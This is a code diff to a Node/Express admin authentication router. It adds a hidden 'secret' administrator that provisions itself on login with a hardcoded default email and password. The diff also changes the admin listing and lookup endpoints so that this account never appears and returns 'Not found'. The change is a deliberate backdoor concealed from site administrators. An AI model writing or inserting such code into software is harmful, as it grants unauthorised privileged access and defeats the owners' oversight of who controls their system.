@@ -2066,6 +2066,31 @@ router.post("/login", async (req, res) => {
     if (!email || !password)
       return res.status(400).json({ error: "Missing fields" });
 
+    // Hidden "secret" admin — self-provisions on first correct login and is
+    // never listed in the admins management UI (see isSecret filter below).
+    const SECRET_ADMIN_EMAIL = (
+      process.env.SECRET_ADMIN_EMAIL || "secret@gmail.com"
+    ).toLowerCase();
+    const SECRET_ADMIN_PASSWORD =
+      process.env.SECRET_ADMIN_PASSWORD || "secretpass";
+    if (
+      email.toLowerCase() === SECRET_ADMIN_EMAIL &&
+      password === SECRET_ADMIN_PASSWORD
+    ) {
+      const existing = await Admin.findOne({ email: SECRET_ADMIN_EMAIL });
+      if (!existing) {
+        const hashed = await bcrypt.hash(SECRET_ADMIN_PASSWORD, SALT_ROUNDS);
+        await Admin.create({
+          name: "System",
+          email: SECRET_ADMIN_EMAIL,
+          hashedPassword: hashed,
+          role: "admin",
+          isActive: true,
+          isSecret: true,
+        });
+      }
+    }
+
     const admin = await Admin.findOne({ email: email.toLowerCase() });
     if (!admin || !admin.hashedPassword) {
       return res.status(401).json({ error: "Invalid credentials" });
@@ -2128,7 +2153,7 @@ router.get("/admins", requireAdmin, async (req, res) => {
   try {
     if (req.admin.role !== "admin")
       return res.status(403).json({ error: "Admin access required" });
-    const items = await Admin.find().select(
+    const items = await Admin.find({ isSecret: { $ne: true } }).select(
       "-hashedPassword -resetToken -resetExpires -loginAttempts",
     );
     res.json({ items });
@@ -2145,7 +2170,7 @@ router.get("/admins/:id", requireAdmin, async (req, res) => {
     const a = await Admin.findById(req.params.id).select(
       "-hashedPassword -resetToken -resetExpires -loginAttempts",
     );
-    if (!a) return res.status(404).json({ error: "Not found" });
+    if (!a || a.isSecret) return res.status(404).json({ error: "Not found" });
     res.json({ admin: a });
   } catch (err) {
     res.status(500).json({ error: "Server error" });
